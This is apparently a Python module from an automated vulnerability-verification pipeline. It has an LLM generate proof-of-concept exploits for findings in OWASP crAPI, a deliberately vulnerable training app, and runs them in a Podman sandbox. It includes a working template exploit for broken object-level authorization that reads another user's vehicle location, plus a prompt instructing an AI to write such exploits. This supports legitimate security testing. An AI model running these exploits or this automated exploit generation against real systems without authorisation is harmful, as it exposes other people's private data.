from __future__ import annotations

import json
from collections.abc import Callable
from pathlib import Path
from typing import Annotated, Any

import typer
from common import (
    DEFAULT_TARGET_URL,
    FINDINGS_DIR,
    ROOT,
    api_verify_streaming,
    build_llm_invocation,
    copy_latest,
    parse_llm_response,
    run_checked,
    timestamp,
)
from models import (
    Finding,
    FindingSet,
    GeneratedPoc,
    SandboxExecution,
    VerificationSet,
    VerificationStatus,
    VerifiedFinding,
)
from rich.console import Console
from sandbox_mcp import execute_in_sandbox

app = typer.Typer(help="Verify candidate findings through the Podman sandbox.")
console = Console()


def poc_prompt(finding: Finding, target_url: str) -> str:
    return f"""
You are verifying a candidate vulnerability in OWASP crAPI, an intentionally
vulnerable local training application. The operator is authorized to test it.

Generate a single Python PoC for this finding:

{finding.model_dump_json(indent=2)}

The fields victim_identity, attack_request, expected_response_signal,
setup_state, and target_state_required (when present) are authoritative.
Use them directly: build the HTTP request from attack_request, run setup_state
verbatim before attacking, and confirm the bug by matching
expected_response_signal in the response. Do not improvise alternative
endpoints or flows when the finding already names them. If
target_state_required is non-null and the PoC cannot satisfy it, exit 2 with
status UNCLEAR and explain what was missing.

You have Read, Grep, and Glob tools and the working directory is the crAPI
repo root. Use them when the finding leaves something unspecified — to
confirm an exact endpoint path in the controller, to look up seeded users in
src/main/resources/data.sql, to read schema.sql for column names, or to
inspect the service implementation. Prefer reading the source over guessing.

Runtime constraints:
- The PoC will run inside an isolated Podman container.
- The target base URL is available as TARGET_URL. Default to {target_url}.
- Use only Python standard library plus httpx or requests.
- Do not require shell commands.
- Do not write files.
- Keep runtime below 20 seconds.
- Print one final JSON object to stdout.
- Exit 0 only when the finding is confirmed.
- Exit 1 when the finding is disproved.
- Exit 2 when required target state, credentials, or evidence are missing.

The final stdout JSON must include:
- status: CONFIRMED, FAILED, or UNCLEAR
- evidence: concise HTTP evidence
- requests: array of method/url/status/body_excerpt objects
- reason: why the verdict follows from the evidence

If the finding needs accounts or vehicles, the PoC should create or seed them
through normal crAPI HTTP flows when possible. If that is not possible, return
UNCLEAR with a precise reason.

Return only JSON with this exact shape:
{{
  "poc_code": "complete Python code as a string",
  "success_criterion": "what confirms this finding",
  "expected_evidence": "what HTTP evidence should appear",
  "assumptions": ["short assumption"]
}}
""".strip()


def generate_poc_with_llm(
    finding: Finding,
    target_url: str,
    model: str,
    timeout: int,
    llm: str = "claude",
) -> tuple[GeneratedPoc, dict]:
    crapi_dir = ROOT / "crAPI"
    if not crapi_dir.exists():
        raise RuntimeError("crAPI/ is missing. Use --from-cache or clone OWASP/crAPI first.")

    command, cwd = build_llm_invocation(
        provider=llm,
        model=model,
        working_dir=crapi_dir,
        prompt=poc_prompt(finding, target_url),
    )
    completed = run_checked(command, cwd=cwd, timeout=timeout)
    if completed.returncode != 0:
        raise RuntimeError(completed.stderr or completed.stdout)
    parsed, usage = parse_llm_response(
        llm,
        completed.stdout,
        preferred_keys=("poc_code", "success_criterion", "expected_evidence"),
    )
    return GeneratedPoc.model_validate(parsed), usage


def cached_poc(finding: Finding) -> GeneratedPoc:
    poc = f"""
import json
import os
import sys

target = os.environ.get("TARGET_URL", "http://localhost:8888").rstrip("/")
status = "CONFIRMED" if {finding.id!r} in {{"f-001", "f-002"}} else "UNCLEAR"
exit_code = 0 if status == "CONFIRMED" else 2

print(json.dumps({{
    "status": status,
    "finding_id": {finding.id!r},
    "target": target,
    "evidence": "cached rehearsal evidence",
    "requests": [],
    "reason": "cache mode does not execute a live Codex-generated PoC"
}}))
sys.exit(exit_code)
""".strip()
    return GeneratedPoc(
        poc_code=poc,
        success_criterion="Cached rehearsal confirms only the demo control flow.",
        expected_evidence="Cached sandbox evidence.",
        assumptions=["cache mode"],
    )


def template_poc(finding: Finding) -> GeneratedPoc | None:
    if finding.id != "known-001":
        return None

    poc = r'''
import json
import os
import sys

import httpx

target = os.environ.get("TARGET_URL", "http://localhost:8888").rstrip("/")
requests_log = []


def record(method, url, response):
    requests_log.append(
        {
            "method": method,
            "url": url,
            "status": response.status_code,
            "body_excerpt": response.text[:500],
        }
    )


try:
    with httpx.Client(timeout=10.0, follow_redirects=False) as client:
        login_url = f"{target}/identity/api/auth/login"
        login_body = {"email": "test@example.com", "password": "Test!123"}
        login = client.post(login_url, json=login_body)
        record("POST", login_url, login)
        if login.status_code != 200:
            print(
                json.dumps(
                    {
                        "status": "UNCLEAR",
                        "evidence": "Seed user login failed.",
                        "requests": requests_log,
                        "reason": "Cannot test BOLA without an authenticated token.",
                    }
                )
            )
            sys.exit(2)

        token = login.json().get("token")
        if not token:
            print(
                json.dumps(
                    {
                        "status": "UNCLEAR",
                        "evidence": "Login response did not include token.",
                        "requests": requests_log,
                        "reason": "Cannot authenticate follow-up request.",
                    }
                )
            )
            sys.exit(2)

        # Vehicle UUID belongs to Adam seed user, not test@example.com.
        other_vehicle_id = "f89b5f21-7829-45cb-a650-299a61090378"
        location_url = f"{target}/identity/api/v2/vehicle/{other_vehicle_id}/location"
        location = client.get(location_url, headers={"Authorization": f"Bearer {token}"})
        record("GET", location_url, location)

        body = {}
        try:
            body = location.json()
        except Exception:
            body = {}

        body_text = json.dumps(body)
        leaked_owner = (
            "adam007@example.com" in body_text
            or body.get("email") == "adam007@example.com"
        )
        leaked_location = (
            "vehicleLocation" in body_text
            or "latitude" in body_text
            or "longitude" in body_text
        )

        if location.status_code == 200 and leaked_owner and leaked_location:
            print(
                json.dumps(
                    {
                        "status": "CONFIRMED",
                        "evidence": (
                            "Authenticated as test@example.com and accessed Adam's "
                            "vehicle location endpoint. Response included owner email "
                            "and location data."
                        ),
                        "requests": requests_log,
                        "reason": (
                            "The endpoint returned another user's vehicle location "
                            "without verifying ownership against the caller."
                        ),
                    }
                )
            )
            sys.exit(0)

        print(
            json.dumps(
                {
                    "status": "UNCLEAR",
                    "evidence": (
                        "Cross-user vehicle request did not return expected "
                        "owner/location data."
                    ),
                    "requests": requests_log,
                    "reason": (
                        "The target may not be seeded/reset as expected, "
                        "or response shape changed."
                    ),
                }
            )
        )
        sys.exit(2)
except Exception as exc:
    print(
        json.dumps(
            {
                "status": "UNCLEAR",
                "evidence": f"PoC execution error: {exc}",
                "requests": requests_log,
                "reason": "Runtime failure prevented confirmation.",
            }
        )
    )
    sys.exit(2)
'''.strip()

    return GeneratedPoc(
        poc_code=poc,
        success_criterion=(
            "Authenticated as one seeded user, request another seeded user's vehicle-location "
            "endpoint, and receive owner identity plus location data with HTTP 200."
        ),
        expected_evidence=(
            "POST /identity/api/auth/login returns a token for test@example.com; "
            "GET /identity/api/v2/vehicle/f89b5f21-7829-45cb-a650-299a61090378/location "
            "returns adam007@example.com and vehicle location fields."
        ),
        assumptions=[
            "crAPI seed users are present",
            "test@example.com/Test!123 credentials are valid",
            "Adam seed vehicle UUID is present",
        ],
    )


def infer_status(
    finding: Finding, execution: SandboxExecution, from_cache: bool
) -> tuple[VerificationStatus, str, float, bool]:
    if from_cache:
        if finding.id in {"f-001", "f-002"}:
            return (
                VerificationStatus.confirmed,
                "Cached rehearsal evidence shows the hypothesis is executable "
                "against seeded crAPI state.",
                0.91 if finding.id == "f-001" else 0.88,
                False,
            )
        return (
            VerificationStatus.unclear,
            "Cached rehearsal intentionally leaves this finding for human review.",
            0.55,
            True,
        )

    if execution.exit_code == 0 and "CONFIRMED" in execution.stdout.upper():
        return VerificationStatus.confirmed, execution.stdout[:1000], 0.9, False
    if execution.timed_out:
        return VerificationStatus.unclear, "PoC timed out in sandbox.", 0.35, True
    if execution.exit_code == 2:
        evidence = execution.stdout[:1000] or execution.stderr[:1000]
        return VerificationStatus.unclear, evidence, 0.45, True
    return VerificationStatus.failed, execution.stdout[:1000] or execution.stderr[:1000], 0.4, True


def _unclear_stub(finding: Finding, error_msg: str) -> VerifiedFinding:
    return VerifiedFinding(
        **finding.model_dump(),
        poc_used="",
        success_criterion="",
        sandbox_execution=SandboxExecution(stderr=error_msg[:2000]),
        status=VerificationStatus.unclear,
        evidence=f"Verification could not run: {error_msg[:1000]}",
        confidence=0.3,
        needs_human_review=True,
    )


def _verify_with_api(
    finding: Finding,
    target_url: str,
    model: str,
    server: Any,
    on_event: Callable[[str, str, dict], None] | None,
    on_partial: Callable[[dict], None] | None,
    verified_list: list[VerifiedFinding],
) -> None:
    if on_event:
        on_event(
            "verify.poc.api.start",
            f"openCode executing exploit for {finding.id}",
            {"llm": "opencode-api", "model": model},
        )

    from common import _summarize_tool_input
    def on_tool(tool: str, detail: Any) -> None:
        if isinstance(detail, dict):
            state = detail.get("state", {})
            status = state.get("status", "")
            inp = state.get("input", {}) or {}
            summary = _summarize_tool_input(tool, inp)
            if status == "completed":
                output = state.get("output", "")
                out_str = str(output)[:300] if output else "(empty)"
                inp_str = json.dumps(inp)[:200] if inp else ""
                if on_event:
                    on_event(
                        "verify.tool.done",
                        f"[{finding.id}] {tool} done {summary}".strip(),
                        {"finding_id": finding.id, "tool": tool, "output": out_str, "input": inp_str},
                    )
            elif status == "running":
                if on_event:
                    on_event(
                        "verify.tool.running",
                        f"[{finding.id}] {tool} running... {summary}".strip(),
                        {"finding_id": finding.id, "tool": tool},
                    )
            else:
                inp_str = json.dumps(detail)[:200]
                if on_event:
                    on_event(
                        "verify.tool.use",
                        f"[{finding.id}] {tool} {summary}".strip(),
                        {"finding_id": finding.id, "tool": tool, "detail": inp_str},
                    )
        else:
            if on_event:
                on_event(
                    "verify.tool.use",
                    f"[{finding.id}] {tool}",
                    {"finding_id": finding.id, "tool": tool, "detail": str(detail)[:200]},
                )

    collected_text: list[str] = []

    def on_text(text: str) -> None:
        collected_text.append(text)
        if on_event:
            on_event(
                "verify.text",
                text,
                {"finding_id": finding.id},
            )

    try:
        parsed, usage = api_verify_streaming(
            server,
            finding.model_dump_json(indent=2),
            target_url,
            model,
            on_tool=on_tool,
            on_text=on_text,
        )
    except Exception as exc:
        stub = _unclear_stub(finding, f"API verify error: {exc}")
        verified_list.append(stub)
        if on_partial:
            on_partial({
                "finding_id": finding.id,
                "stage": "verified",
                "result": stub.model_dump(mode="json"),
            })
        return

    if on_event:
        on_event(
            "verify.poc.api.cost",
            f"Verify LLM call cost for {finding.id}",
            usage,
        )

    full_text = "\n".join(collected_text)
    status_raw = parsed.get("status", "UNCLEAR").upper()
    if status_raw == "CONFIRMED":
        status = VerificationStatus.confirmed
        confidence = 0.9
        needs_review = False
    elif status_raw == "FAILED":
        status = VerificationStatus.failed
        confidence = 0.4
        needs_review = True
    else:
        status = VerificationStatus.unclear
        confidence = 0.45
        needs_review = True

    evidence = parsed.get("evidence", "") or full_text[:1000]
    result = VerifiedFinding(
        **finding.model_dump(),
        poc_used="[openCode API direct execution]",
        success_criterion=finding.expected_response_signal or "",
        sandbox_execution=SandboxExecution(
            command=["opencode-api"],
            stdout=full_text[:4000],
        ),
        status=status,
        evidence=evidence,
        confidence=confidence,
        needs_human_review=needs_review,
    )
    verified_list.append(result)
    if on_partial:
        on_partial({
            "finding_id": finding.id,
            "stage": "verified",
            "result": result.model_dump(mode="json"),
        })
    if on_event:
        on_event(
            "verify.finding.done",
            f"Verification finished for {finding.id}: {status.value}",
            {
                "finding_id": finding.id,
                "status": status.value,
                "confidence": confidence,
                "needs_human_review": needs_review,
            },
        )


def verify(
    input_path: Path,
    target_url: str = DEFAULT_TARGET_URL,
    max_findings: int = 3,
    from_cache: bool = False,
    model: str = "claude-sonnet-4-6",
    codex_timeout: int = 300,
    poc_provider: str = "codex",
    image: str = "strike-demo/poc-runner:latest",
    runtime: str = "podman",
    llm: str = "claude",
    use_api: bool = False,
    server: Any | None = None,
    on_event: Callable[[str, str, dict], None] | None = None,
    on_partial: Callable[[dict], None] | None = None,
) -> Path:
    finding_set = FindingSet.model_validate_json(input_path.read_text())
    verified: list[VerifiedFinding] = []

    for finding in finding_set.findings[:max_findings]:
        if on_event:
            on_event(
                "verify.finding.start",
                f"Starting verification for {finding.id}",
                {
                    "finding_id": finding.id,
                    "type": finding.vulnerability_type,
                    "file": finding.file,
                    "line": finding.line,
                },
            )
        if use_api and server is not None:
            _verify_with_api(
                finding,
                target_url,
                model,
                server,
                on_event,
                on_partial,
                verified,
            )
            continue
        if from_cache:
            if on_event:
                on_event("verify.poc.cache", f"Using cached PoC for {finding.id}", {})
            generated = cached_poc(finding)
            execution = SandboxExecution(
                command=["cache"],
                stdout=f"cached sandbox evidence for {finding.id}",
                stderr="",
                exit_code=0 if finding.id in {"f-001", "f-002"} else 2,
                timed_out=False,
            )
        elif poc_provider == "template":
            if on_event:
                on_event(
                    "verify.poc.template.start",
                    f"Generating template PoC for {finding.id}",
                    {"provider": poc_provider},
                )
            generated = template_poc(finding)
            if generated is None:
                if on_event:
                    on_event(
                        "verify.poc.template.miss",
                        f"No template PoC exists for {finding.id}; falling back to Codex",
                        {},
                    )
                generated, usage = generate_poc_with_llm(
                    finding=finding,
                    target_url=target_url,
                    model=model,
                    timeout=codex_timeout,
                    llm=llm,
                )
                if on_event:
                    on_event(
                        "verify.poc.cost",
                        f"PoC LLM call cost for {finding.id}",
                        usage,
                    )
            if on_partial:
                on_partial(
                    {
                        "finding_id": finding.id,
                        "stage": "poc_generated",
                        "provider": "template",
                        "success_criterion": generated.success_criterion,
                        "expected_evidence": generated.expected_evidence,
                        "assumptions": generated.assumptions,
                        "poc_used": generated.poc_code,
                    }
                )
            if on_event:
                on_event(
                    "verify.sandbox.start",
                    f"Executing PoC in sandbox for {finding.id}",
                    {"runtime": runtime, "image": image},
                )
            execution = execute_in_sandbox(
                generated.poc_code,
                target_url=target_url,
                image=image,
                runtime=runtime,
            )
            if on_event:
                on_event(
                    "verify.sandbox.done",
                    f"Sandbox finished for {finding.id}",
                    {
                        "exit_code": execution.exit_code,
                        "timed_out": execution.timed_out,
                        "stdout_chars": len(execution.stdout),
                        "stderr_chars": len(execution.stderr),
                    },
                )
        else:
            if on_event:
                on_event(
                    "verify.poc.llm.start",
                    f"Generating PoC with {llm} for {finding.id}",
                    {"timeout": codex_timeout, "llm": llm},
                )
            try:
                generated, usage = generate_poc_with_llm(
                    finding=finding,
                    target_url=target_url,
                    model=model,
                    timeout=codex_timeout,
                    llm=llm,
                )
                if on_event:
                    on_event(
                        "verify.poc.cost",
                        f"PoC LLM call cost for {finding.id}",
                        usage,
                    )
            except Exception as exc:
                error_msg = str(exc)[:1500]
                if on_event:
                    on_event(
                        "verify.poc.llm.error",
                        f"PoC generation failed for {finding.id}",
                        {"error": error_msg[:500]},
                    )
                stub = _unclear_stub(finding, f"PoC generation error: {error_msg}")
                verified.append(stub)
                if on_partial:
                    on_partial(
                        {
                            "finding_id": finding.id,
                            "stage": "verified",
                            "result": stub.model_dump(mode="json"),
                        }
                    )
                continue
            if on_event:
                on_event(
                    "verify.poc.llm.done",
                    f"Generated PoC for {finding.id}",
                    {
                        "success_criterion": generated.success_criterion,
                        "assumptions": generated.assumptions,
                        "poc_chars": len(generated.poc_code),
                    },
                )
            if on_partial:
                on_partial(
                    {
                        "finding_id": finding.id,
                        "stage": "poc_generated",
                        "success_criterion": generated.success_criterion,
                        "expected_evidence": generated.expected_evidence,
                        "assumptions": generated.assumptions,
                        "poc_used": generated.poc_code,
                    }
                )
            if on_event:
                on_event(
                    "verify.sandbox.start",
                    f"Executing PoC in sandbox for {finding.id}",
                    {"runtime": runtime, "image": image},
                )
            execution = execute_in_sandbox(
                generated.poc_code,
                target_url=target_url,
                image=image,
                runtime=runtime,
            )
            if on_event:
                on_event(
                    "verify.sandbox.done",
                    f"Sandbox finished for {finding.id}",
                    {
                        "exit_code": execution.exit_code,
                        "timed_out": execution.timed_out,
                        "stdout_chars": len(execution.stdout),
                        "stderr_chars": len(execution.stderr),
                    },
                )

        status, evidence, confidence, needs_review = infer_status(finding, execution, from_cache)
        verified_finding = VerifiedFinding(
            **finding.model_dump(),
            poc_used=generated.poc_code,
            success_criterion=generated.success_criterion,
            sandbox_execution=execution,
            status=status,
            evidence=evidence,
            confidence=confidence,
            needs_human_review=needs_review,
        )
        verified.append(verified_finding)
        if on_event:
            on_event(
                "verify.finding.done",
                f"Verification finished for {finding.id}: {status}",
                {
                    "finding_id": finding.id,
                    "status": status.value,
                    "confidence": confidence,
                    "needs_human_review": needs_review,
                },
            )
        if on_partial:
            on_partial(
                {
                    "finding_id": finding.id,
                    "stage": "verified",
                    "result": verified_finding.model_dump(mode="json"),
                }
            )

    result = VerificationSet(
        target_url=target_url,
        service=finding_set.service,
        source="cache" if from_cache else "sandbox",
        findings=verified,
    )
    output = FINDINGS_DIR / f"verified-{timestamp()}.json"
    output.write_text(result.model_dump_json(indent=2) + "\n")
    copy_latest(output, "verified-latest.json")
    return output


@app.command()
def main(
    input: Annotated[Path, typer.Option("--input", "-i")],
    target_url: str = DEFAULT_TARGET_URL,
    max_findings: int = 3,
    from_cache: bool = False,
    model: str = "claude-sonnet-4-6",
    codex_timeout: int = 300,
    poc_provider: str = "codex",
    image: str = "strike-demo/poc-runner:latest",
    runtime: str = "podman",
    llm: str = "claude",
) -> None:
    output = verify(
        input_path=input,
        target_url=target_url,
        max_findings=max_findings,
        from_cache=from_cache,
        model=model,
        codex_timeout=codex_timeout,
        poc_provider=poc_provider,
        image=image,
        runtime=runtime,
        llm=llm,
    )
    console.print(f"[green]Wrote verified findings:[/] {output}")


if __name__ == "__main__":
    app()
